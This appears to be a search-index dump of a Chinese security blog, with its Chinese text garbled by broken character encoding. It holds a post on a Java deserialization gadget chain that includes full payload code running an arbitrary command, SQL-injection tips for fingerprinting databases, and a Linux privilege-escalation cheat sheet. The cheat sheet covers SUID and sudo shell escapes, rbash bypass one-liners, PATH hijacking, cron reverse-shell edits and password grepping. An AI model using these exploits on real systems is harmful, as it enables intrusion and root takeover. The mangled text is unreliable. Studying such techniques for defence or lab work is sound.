è¿™ä¸ªæ–¹æ³•ä¼šéå†this.memberValueså±æ€§ï¼ˆè¿™ä¸ªå±æ€§å®è´¨ä¸Šå°±æ˜¯HashMapå†…æ·»åŠ çš„å±æ€§ï¼‰ï¼Œç„¶åå¯¹å…¶ä¸­æ¯ä¸€é¡¹é”®å€¼å±æ€§è¿›è¡Œè¿›è¡Œä½è¿ç®—å¹¶ç´¯åŠ  å…¶ä¸­memberValueHashCodeå‡½æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥è·Ÿè¿›ä¸€ä¸‹ å‘ç°åªè¦ä¼ å…¥å‚æ•°ä¸ä¸ºæ•°ç»„ï¼Œå°±è°ƒç”¨å®ƒçš„hashCodeå‡½æ•°å¹¶è¿”å›ã€‚ æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ï¼Œæ€ä¹ˆæ‰èƒ½è°ƒç”¨åˆ°putæ–¹æ³•é‡Œçš„equalsè§¦å‘ä»£ç æ‰§è¡Œï¼špayloadé˜¶æ®µï¼š å»ºç«‹ä¸€ä¸ªmapå˜é‡ï¼Œå…¶keyä¸ºç‰¹æ®Šçš„ä¸€ä¸ªå€¼:f5a5a608,è¿™ä¸ªå€¼çš„hashCodeæ˜¯0ï¼Œç„¶åå€¼ä¸ºæ¶æ„templatesImplç±»ï¼Œç„¶åä»¥è¿™ä¸ªmapå˜é‡ä¸ºå‚æ•°å»ºç«‹AnnotationInvocationHandlerä»£ç†å¯¹è±¡ã€‚ å†å‘HashMapé‡Œæ”¾å…¥ä¸€ä¸ªå€¼ï¼Œé”®ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œå†æ”¾å…¥ä¸€ä¸ªå€¼ï¼Œé”®ä¸ºæ¶æ„AnnotationInvocationHandlerå¯¹è±¡ã€‚ï¼ˆLinkedHashSetä¼šè®©HashMapæœ‰åºï¼Œä»è€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½æŒ‰é¡ºåºä¾æ¬¡ä»HashMapè¯»å–å¯¹è±¡ã€‚å¦‚æœç”¨HashSetï¼Œåˆ™ä¼šåœ¨ååºåˆ—åŒ–æ—¶æŠ¥é”™ï¼‰ ååºåˆ—åŒ–é˜¶æ®µï¼š éšååœ¨readObjectæ—¶ï¼ŒTemplatesImplå…ˆè¢«putæ–¹æ³•è°ƒç”¨ã€‚ ç„¶ååœ¨putæ–¹æ³•é‡Œé€šè¿‡hash()æ–¹æ³•è·å¾—å…¶hashï¼Œå¹¶å°†å…¶å½•å…¥åˆ°å®ƒçš„hashå±æ€§é‡Œï¼Œç„¶åå†™å…¥åˆ°HashMapçš„å­˜å‚¨é˜Ÿåˆ—é‡Œã€‚ ç„¶åAnnotationInvocationHandlerå†è¢«putæ–¹æ³•è°ƒç”¨ åœ¨å¯¹å…¶ä½¿ç”¨hashæ–¹æ³•è·å¾—hashæ—¶ï¼Œä¼šå› å…¶æ˜¯ä¸€ä¸ªä»£ç†ç±»çš„ç¼˜æ•…åœ¨hashå‡½æ•°å†…éƒ¨è°ƒç”¨hashCode()æ–¹æ³•æ—¶ä¼šè°ƒç”¨å…¶ä»£ç†æ–¹æ³•hashCodeImplã€‚ éšååœ¨hashCodeImplå†…éƒ¨éå†this.memberValueså˜é‡ï¼ˆä¹Ÿå°±æ˜¯ä¹‹å‰åˆå§‹åŒ–æ—¶æ”¾å…¥çš„mapå˜é‡ï¼‰ å°†æ¯ä¸€é¡¹çš„keyå€¼çš„hashCodeä¸ä¼ å…¥map vauleå€¼ä½œä¸ºå‚æ•°çš„memberValueHashCodeæ–¹æ³•è¿›è¡Œå¼‚æˆ–ã€‚è¿™ä¸ªmemberValueHashCodeæ–¹æ³•ä¼šåˆ¤æ–­ä¼ å…¥çš„å€¼æ˜¯å¦ä¸ºæ•°ç»„ï¼Œè‹¥ä¸æ˜¯æ•°ç»„åˆ™ç›´æ¥è¿”å›å‚æ•°çš„hashCode()ã€‚ å› ä¸ºæˆ‘ä»¬ä¹‹å‰åˆå§‹åŒ–ä»£ç†å¯¹è±¡æ—¶ä¼ å…¥çš„æ˜¯ä¸€ä¸ªé”®ä¸ºf5a5a608ï¼Œå€¼ä¸ºeviltemplatesçš„mapï¼Œæ‰€ä»¥ä»¥ä¸Šhashè®¡ç®—æœ€ç»ˆå¾—åˆ°çš„ç»“æœï¼Œä¾¿æ˜¯0^(templatesImpl.hashCode()). ä¹Ÿå°±æ˜¯templatesImpl.hashCode()ã€‚æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´AnnotationInvocationHandlerå¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥è¢«hashæ–¹æ³•æ‰§è¡Œåçš„ç»“æœï¼Œå°±ç›¸å½“äºæ˜¯hash(eviltemplates) éšåè¿™ä¸ªå€¼æ¥åˆ°ifåˆ¤æ–­é€»è¾‘ï¼Œå®ƒéå†ä¹‹å‰çš„å€¼ï¼Œå¹¶å°†éå†å¾—åˆ°çš„å€¼èµ‹ç»™var5 ä¸Šä¸€ä¸ªå€¼çš„hashï¼ˆä¹Ÿå°±æ˜¯eviltemplatesçš„hashï¼‰ä¸AnnotationInvocationHandlerå¯¹è±¡çš„hashï¼ˆä¹Ÿè¿˜æ˜¯eviltemplatesçš„hashï¼‰ç›¸åŒï¼Œä½†æ˜¯AnnotationInvocationHandlerå¯¹è±¡ä¸eviltemplateså¯¹è±¡å¹¶ä¸ç›¸åŒï¼Œæ‰€ä»¥ä¾¿è§¦åŠ¨äº†equalsï¼Œä»£ç æ‰§è¡ŒæˆåŠŸã€‚ å®Œæ•´payloadçºµè§‚ä»¥ä¸Šä¸‰ä¸ªç±»ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºpayload public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc); cons.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„ try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯ Field.setAccessible(true); &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—® if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; Map map &#x3D; new HashMap(); String magicStr &#x3D; &quot;f5a5a608&quot;; final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map); Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); HashSet target &#x3D; new LinkedHashSet(); target.add(templates); target.add(proxy); &#x2F;&#x2F;è¿™ä¸ªmapéœ€è¦åœ¨Hashmap putäº†proxyåå†èµ‹å€¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ map.put(magicStr, templates); &#x2F;&#x2F; åºåˆ—åŒ– ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(filename)); oos.writeObject(target); &#x2F;&#x2F; ååºåˆ—åŒ– ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); çœ‹ä¸€ä¸‹è°ƒç”¨æ ˆ æ›´ç›´è§‚çš„è°ƒç”¨é“¾ LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... &#x2F;&#x2F; TemplatesImpl.getOutputProperties()ï¼Œå®é™…æµ‹è¯•æ—¶ä¼šç›´æ¥è°ƒç”¨ newTransformer() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() æ€»ç»“è¿™ä¸ªé“¾æ˜¯ç›®å‰è°ƒè¿‡æœ€é•¿çš„äº†â€¦. èƒ½æƒ³å‡ºè¿™ç§é“¾çš„ç»å£æ˜¯å¤©æ‰å§","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"sqlæ³¨å…¥åˆ¤æ–­ä¸åŒæ•°æ®åº“çš„tips","slug":"åˆ¤æ–­ä¸åŒæ•°æ®åº“çš„æ–¹æ³•tips","date":"2021-05-23T06:44:46.917Z","updated":"2021-05-04T07:51:24.714Z","comments":true,"path":"2021/05/23/åˆ¤æ–­ä¸åŒæ•°æ®åº“çš„æ–¹æ³•tips/","link":"","permalink":"http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/","excerpt":"","text":"ç»éªŒä¹‹è°ˆAspå’Œ.neté€šå¸¸ä½¿ç”¨sqlserver Phpé€šå¸¸ä½¿ç”¨mysqlæˆ–è€…postgresql Javaé€šå¸¸æ˜¯oracleæˆ–mysql IisæœåŠ¡å™¨æ˜¯åŸºäºwindowsçš„æ¶æ„ï¼Œåå°æ•°æ®åº“æœ‰å¯èƒ½æ˜¯sqlserver ApacheæœåŠ¡å™¨ï¼Œå¯èƒ½ä½¿ç”¨å¼€æºæ•°æ®åº“mysqlæˆ–postgresql å­—ç¬¦ä¸²æ‹¼æ¥ORACLEï¼š&#39;a&#39;||&#39;a&#39; &#x3D;aaMS-SQLï¼š&#39;a&#39;+&#39;a&#39; &#x3D;aaMYSQLï¼š&#39;a&#39; &#39;a&#39; &#x3D;aa ç‰¹æœ‰å‡½æ•°æ—¶é—´å»¶è¿Ÿå‡½æ•°oracle: ä½¿ç”¨UTL_HTTPå‘ä¸€ä¸ªä¸å­˜åœ¨çš„ipå‘èµ·é“¾æ¥è¯·æ±‚ï¼Œè‹¥è¿”å›é¡µé¢å¤§å¹…åº¦å»¶è¿Ÿåˆ™å¯åˆ¤å®šä¸ºoracle mssql:ä½¿ç”¨è¯­å¥ waitfor delay â€˜0:0:10â€™ è‹¥è¿”å›é¡µé¢å¤§å¹…åº¦å»¶è¿Ÿåˆ™å¯åˆ¤å®šä¸ºmssql mysql: sleepå‡½æ•°æ¥äº§ç”Ÿå»¶è¿Ÿ mysqlç‰¹æœ‰å‡½æ•°BENCHMARK. ç”¨äºæµ‹è¯•ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦select BENCHMARK(1000000,md5(â€˜adminâ€™)) æŠ¥é”™å°è¯•è®©è¯­å¥æŠ¥é”™ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­è·å–æ•°æ®åº“ä¿¡æ¯ ç‰ˆæœ¬ä¿¡æ¯ ç³»ç»Ÿè¡¨mssql:(select count(*) from sysobjects)&gt;0access: (select count(*) from msysobjects)&gt;0mysql:(select count(*) from information_schema.TABLES)&gt;0orcle:(select count(*) from sys.user_tables)&gt;0","categories":[],"tags":[{"name":"å¤–å›´æ‰“ç‚¹","slug":"å¤–å›´æ‰“ç‚¹","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"Linux ææƒæ€»ç»“","slug":"Linuxææƒæ€»ç»“","date":"2021-03-12T06:33:21.708Z","updated":"2021-03-16T13:36:09.073Z","comments":true,"path":"2021/03/12/Linuxææƒæ€»ç»“/","link":"","permalink":"http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","excerpt":"","text":"sudo å’Œ suid ææƒä½•ä¸ºsuid å¯è§åœ¨æƒé™ä½ç½®æœ‰ä¸€ä¸ªsæƒé™ã€‚é‚£ä¹ˆè¿™ä¸ªsçš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç­”æ¡ˆæ˜¯å½“å…¶ä»–ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šä»¥rootçš„èº«ä»½æ‰§è¡Œã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°äº†Effective UIDå’ŒReal UIDä»¥åŠSaved UIDEffective UID: ç¨‹åºå®é™…æ“ä½œæ—¶ç”Ÿæ•ˆçš„UIDReal UID: æ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·çš„å®é™…UIDSaved UID: åœ¨é«˜æƒé™ç”¨æˆ·é™æƒåï¼Œä¿ç•™çš„å…¶åŸæœ¬UID (ä¸å±•å¼€è¯´) æ‰€ä»¥å¢åŠ äº†ä¸€ä¸ªsæƒé™ï¼Œè¯¥ç¨‹åºåœ¨å®é™…è¿è¡Œæ—¶Effective UIDå°±ä¼šå˜ä¸º0ï¼Œå³rootçš„UID sudoå°±æ˜¯èƒ½æŠŠä¸€ä¸ªå‘½ä»¤è§†ä½œrootæ¥æ‰§è¡Œ,ç”¨sudo-læŸ¥çœ‹å¯ä»¥è¢«sudoçš„å‘½ä»¤ SUIDä¸sudoææƒéå†ç›®å½•ä¸­çš„suidæ–‡ä»¶find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä¼šå¾—åˆ°æ‰€æœ‰suidæ–‡ä»¶ ç”¨sudo -l æŸ¥çœ‹å“ªäº›å‘½ä»¤èƒ½è¢«sudoå¯åˆ©ç”¨äºææƒçš„å‘½ä»¤1.nmapnmap --interactive ä½¿ç”¨nmapçš„udpæˆ–tcp synæ‰«ææ—¶ï¼Œéœ€è¦ç”¨åˆ°rootæƒé™ï¼Œæ‰€ä»¥æœ‰äº›ç®¡ç†å‘˜å›¾æ–¹ä¾¿ä¼šç›´æ¥ç»™nampä¸Šsæƒé™ï¼Œè€Œnmap 5.20(ä½¿ç”¨nmap -væŸ¥çœ‹nmapç‰ˆæœ¬)ä¹‹å‰æœ‰ä¸€ä¸ªinteractiveäº¤äº’æ¨¡å¼(nmap â€“interactive)ï¼Œåœ¨nmap effective uidä¸º0æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¨¡å¼è·å¾—rootæƒé™äº¤äº’å¼å‘½ä»¤è¡Œï¼ŒæˆåŠŸææƒ echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shellnmap --script&#x3D;shell å…¨ç‰ˆæœ¬é€šæ€ææƒï¼Œåˆ©ç”¨nmapå¯ä»¥æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶çš„ç‰¹ç‚¹ææƒ 2.findfind &#x2F; -exec command findå‘½ä»¤è‡ªå¸¦-execå‚æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè‹¥findæœ‰suidæƒé™ï¼Œé‚£ä¹ˆä½¿ç”¨execç›¸å½“äºç›´æ¥ææƒåˆ°root. è¯»æ–‡ä»¶ find &#x2F;path -exec &#123;&#125; \\; 3.vimvimæœ‰äº†suidå°±å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–äº† åŒæ—¶ä¹Ÿå¯ä»¥è¾“å…¥ :shell æ¥è·å–root shell 4.bashbash -p å¼€å¯ä¸€ä¸ªæ–°shellï¼Œsuidçš„è¯è‡ªç„¶æ˜¯å¼€å¯root shell 5.lessï¼Œmoreå’Œvimå·®ä¸å¤šï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¾“å…¥ !command è¿›è¡Œææƒåˆ°root 6.eximeximåœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹ä¼šæœ‰suidææƒ ä¸‹è½½expæ‰“å°±å®Œäº‹äº† rbash ç»•è¿‡ä½•ä¸ºrbashrbashï¼Œæ˜¯å‡ºäºå®‰å…¨æ€§è€ƒè™‘çš„ä¸€ä¸ªåŠŸèƒ½å—é™çš„bashï¼Œæˆ‘åœ¨vulnhub dc-2é¦–æ¬¡æ¥è§¦,ä»–çš„é™åˆ¶æ€§å¯èƒ½ä¼šæœ‰å¦‚ä¸‹. cd åˆ‡æ¢ç›®å½• å«æœ‰æ–œæ  / çš„å‘½ä»¤, è­¬å¦‚ /bin/sh è®¾ç½® PATH ENV ç­‰ç¯å¢ƒå˜é‡ ä½¿ç”¨ &gt; &lt; è¿›è¡Œé‡å®šå‘ binary çš„è¿è¡Œ. é€šå¸¸ root ç”¨æˆ·ä¼šæ‰‹åŠ¨åˆ›å»º /bin/binary_file -&gt; /home/rbash_user/bin/binary_file çš„è½¯é“¾æ¥, é™åˆ¶æ€§åœ°æä¾›éƒ¨åˆ† binary_file ç»™ rbash_user ä½¿ç”¨ åœ¨ bash ä¸‹ echo $SHELL, å¯ä»¥è·å–å½“å‰ç¯å¢ƒæ˜¯å¦æ˜¯ rbash. bypassscp bypassæˆ‘åœ¨http://www.const27.com/2020/07/02/vulnhub-dc-2/å°±æ˜¯ç”¨scpç»•çš„ è¿›å…¥å‘½ä»¤è‡ªå¸¦shell bypassman,git config help,more,less,vim,vi,ftp,gdbç­‰å‘½ä»¤éƒ½æœ‰è‡ªå·±çš„shellï¼Œæˆ‘ä»¬åªéœ€åœ¨ä»–ä»¬å„è‡ªçš„shellä¸­æ‰§è¡Œ/bin/shå³å¯ä¸€èˆ¬éƒ½æ˜¯åœ¨shellé”®å…¥!/bin/shæ¥bypass rbash ä¸‹é¢è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ï¼ˆä¼¼ä¹ä»…vim) :set shell&#x3D;&#x2F;bin&#x2F;bash:shell æ‰§è¡Œä¸Šé¢ä¸¤ä¸ªè¯­å¥ï¼Œå°±bypassäº† find bypasssç®€å•æ¦‚æ‹¬å°±æ˜¯-execæ‰§è¡Œä¸€ä¸‹/bin/bash â€¦ ç¼–ç¨‹è¯­è¨€ bypasspython å¦‚æœpythonéƒ½å¯ä»¥ç”¨çš„è¯ï¼Œé‚£å°±æ›´è½»æ¾äº†ï¼Œoså®‰æ’ä¸€ä¸‹ä¼¼ä¹ptyä¹Ÿè¡Œ?æ²¡è¯• python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; php php -a è¿›å…¥php shellç„¶åæ‰§è¡Œå‘½ä»¤:exec(&quot;&#x2F;bin&#x2F;bash&quot;); perl perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; ruby ruby -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;&#39; cp bypassç›´æ¥ç”¨cpæŠŠ/usr/biné‡Œçš„å‘½ä»¤å¤åˆ¶è¿‡æ¥å°±è¡Œäº† ç›´æ¥æ›´æ”¹PATH/SHELLå˜é‡é”®å…¥export -p æŸ¥çœ‹è¯¥ç”¨æˆ·çš„å˜é‡ å¦‚æœè¿™ä¿©å˜é‡æœ‰wæƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥æ¥bypass ssh bypassåŸç†æ˜¯é€šè¿‡sshé“¾æ¥å½“å‰IPçš„å½“å‰ç”¨æˆ·å¹¶å¯åŠ¨/bin/bash ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot; å†…æ ¸ææƒç”¨ uanme -a æŸ¥æ˜å†…æ ¸ç‰ˆæœ¬ ç„¶åæ‰¾expæ‰“å°±å®Œäº‹äº†ï¼Œå†…æ ¸ææƒçš„å†…å®¹æœ‰ç‚¹åº•å±‚ï¼Œæš‚æ—¶ä¸ç”¨æ·±å…¥äº†è§£ passwdå’Œshadowæ˜æ–‡å¯†ç /etc/passwd é»˜è®¤æ‰€æœ‰ç”¨æˆ·å¯è¯»ï¼Œä½†åªæœ‰rootå¯å†™ã€‚/etc/passwdé‡Œçš„ç”¨æˆ·å£ä»¤å¾€å¾€ä»¥xä»£æ›¿ï¼Œå…¶åŠ å¯†åçš„å¯†ç ä¼šå­˜å…¥/etc/shadowé‡Œé¢ï¼Œ/etc/shadowé»˜è®¤åªæœ‰rootå¯è¯»ã€‚ ä½†æ˜¯æœ‰å°æ¦‚ç‡æƒ…å†µï¼Œæ˜æ–‡å¯†ç å°±ç›´æ¥å‡ºç°åœ¨/etc/passwdäº†ï¼Œå¦‚æœæœ‰è¿™ä¸ªæƒ…å†µä¸”rootå¯†ç æš´éœ²åœ¨äº†passwdé‡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥è½»è€Œæ˜“ä¸¾ææƒäº† passwd å¯å†™å¦‚æœ/etc/passwd æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯å†™ï¼Œå¯ä»¥ç›´æ¥æŠŠrootçš„å¯†ç æ”¹æˆä¸€ä¸ªæ˜æ–‡å¯†ç ï¼Œä»è€Œè¾¾åˆ°ææƒç›®çš„ çˆ†ç ´shadowå¦‚æœ/etc/shadow å¯è¯»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨hashcatæˆ–è€…johnæš´åŠ›ç ´è§£shadowæ–‡ä»¶ è®¡åˆ’ä»»åŠ¡æ–‡ä»¶é‡å†™è®¡åˆ’ä»»åŠ¡ç”±crontabç®¡ç†ï¼Œérootç”¨æˆ·æ˜¯æ— æ³•åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ—å‡º/etcçš„ç³»ç»Ÿä»»åŠ¡ï¼Œç³»ç»Ÿä»»åŠ¡é»˜è®¤æ˜¯rootæƒé™è¿è¡Œçš„ ls -l &#x2F;etc&#x2F;cron* å¦‚æœæˆ‘ä»¬æœ‰å¹¸æœ‰æƒé™èƒ½æ›´æ”¹å…¶ä¸­ä¸€ä¸ªä»»åŠ¡æŒ‡å®šçš„è„šæœ¬ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€è„šæœ¬é‡Œæ·»åŠ å¦‚åå¼¹shellç­‰æŒ‡ä»¤ï¼Œä»è€Œææƒ ç¯å¢ƒå˜é‡åŠ«æŒæˆ‘ä»¬æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ å‘ç°å®šä¹‰äº†è¯¸å¤šç¯å¢ƒå˜é‡ï¼Œå¦‚æœå…¶ä»»åŠ¡æœ‰æœªæŒ‡å®šç»å¯¹è·¯å¾„çš„æŒ‡ä»¤ï¼Œå¦‚ 17 * * * * root shell.sh è€Œä¸”æˆ‘ä»¬åœ¨å…¶ç¯å¢ƒå˜é‡è·¯å¾„ä¸­å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å†™å…¥ç¯å¢ƒå˜é‡çš„é å‰è·¯å¾„ä¸€ä¸ªåŒåæ¶æ„æ–‡ä»¶ä»è€Œå¯¼è‡´ç¯å¢ƒå˜é‡åŠ«æŒ æ¯”å¦‚æˆ‘ä»¬åœ¨/sbin å†™å…¥ä¸€ä¸ª åå¼¹shellåŠŸèƒ½çš„shell.shï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆææƒ é€šé…ç¬¦ææƒhttps://www.secpulse.com/archives/72965.html æ€»ç»“çš„å¤ªå¥½äº†ï¼Œæˆ‘éƒ½ä¸æƒ³è®°ç¬”è®°äº†ï¼ˆå·æ‡’ ç¯å¢ƒå˜é‡å¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªsuidæƒé™çš„ç¨‹åºï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•å®Œæˆsuidææƒï¼Œå°±å¯ä»¥è¯•è¯•æ­é…ç¯å¢ƒå˜é‡è¿›è¡Œææƒã€‚ è¿™ä¸ªææƒæ–¹æ³•çš„æ€æƒ³æ˜¯ï¼Œæ‰¾åˆ°æœ‰suidçš„ï¼Œå†…éƒ¨æœ‰systemå‡½æ•°è°ƒç”¨æœªæŒ‡å®šè·¯å¾„çš„å‘½ä»¤çš„æ–‡ä»¶ã€‚åŒæ—¶ç”¨æˆ·æœ‰ä¿®æ”¹è‡ªå·±ç¯å¢ƒå˜é‡çš„æƒé™ï¼Œ æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åŠ«æŒsystemå‡½æ•°é‡Œè°ƒç”¨çš„è„šæœ¬æ–‡ä»¶ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬ç¯å¢ƒå˜é‡é‡Œè‡ªè¡Œåˆ›å»ºçš„ä¸€ä¸ªåŒåè„šæœ¬æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæˆ‘ä»¬è‡ªè¡Œåˆ›å»ºçš„åŒåè„šæœ¬æ–‡ä»¶å°±èƒ½ä»¥rootæƒé™è¿è¡Œäº†ï¼Œå¦‚æœè¿™ä¸ªè„šæœ¬æ–‡ä»¶é‡Œçš„å‘½ä»¤æ˜¯/bin/bashï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæˆ‘ä»¬ææƒäº†ã€‚ å¯èƒ½æœ‰ç‚¹å°ç»•ï¼Œçœ‹ä¸‹é¢å…·ä½“æ“ä½œå°±è¡Œäº†ã€‚ å®éªŒå®¤é…ç½®: é¦–å…ˆåœ¨ä¸€ä¸ªç›®å½•ä¸‹åˆ›å»ºå¦‚ä¸‹æ–‡ä»¶ vim demo.c ç„¶å gcc demo.c -o shell å°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ ç„¶å chmod u+s shell ä¸ºå…¶å¢åŠ suidæƒé™ æ”»å‡»è€…è§†è§’: é¦–å…ˆä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤æœå¯»suidæƒé™æ–‡ä»¶ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null å‘ç°å¯ç–‘ç›®æ ‡ï¼Œæ‰§è¡Œä¸€ä¸‹çœ‹çœ‹ å‘ç°è¿”å›äº†pså‘½ä»¤çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤çŒœæµ‹è¿™ä¸ªæ–‡ä»¶å†…éƒ¨ æœ‰ system(â€œpsâ€); è¿™æ¡cè¯­è¨€ä»£ç ã€‚é‚å¯å°è¯•ç¯å¢ƒå˜é‡ææƒ æˆ‘ä»¬ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt; psexport $PATH&#x3D;&#x2F;tmp:$PATH éœ€è¦ä¿®æ”¹è‡ªèº«ç¯å¢ƒå˜é‡çš„æƒé™ï¼Œä½†åŸºæœ¬ä¸Šéƒ½æœ‰è¿™ä¸ªæƒé™chmod 777 .&#x2F;ps æ²¡è¿™æ¡å‘½ä»¤ä¼šå¯¼è‡´ææƒå¤±è´¥cd &#x2F;home&#x2F;const27.&#x2F;shell ææƒæˆåŠŸ å¯†ç æŸ¥æ‰¾è¿™ä¸ªææƒæŠ€æœ¯è¯´ç™½äº†ï¼Œå°±æ˜¯å»åˆ°å¤„ç¿»å¯†ç  æ–‡ä»¶å†…æŸ¥æ‰¾grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;nullfind . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \\; æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸Šå‘½ä»¤ï¼ŒæŒ‡å®šå…³é”®å­—ï¼Œåœ¨æ‰€æœ‰æ–‡ä»¶ä¸­æœç´¢å†…å®¹ä¸­æœ‰å…³é”®å­—çš„æ–‡ä»¶ã€‚ æŸ¥æ‰¾ååˆ†é’Ÿå†…æ›´æ”¹è¿‡çš„æ–‡ä»¶find &#x2F; -mmin -10 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;proc&quot; 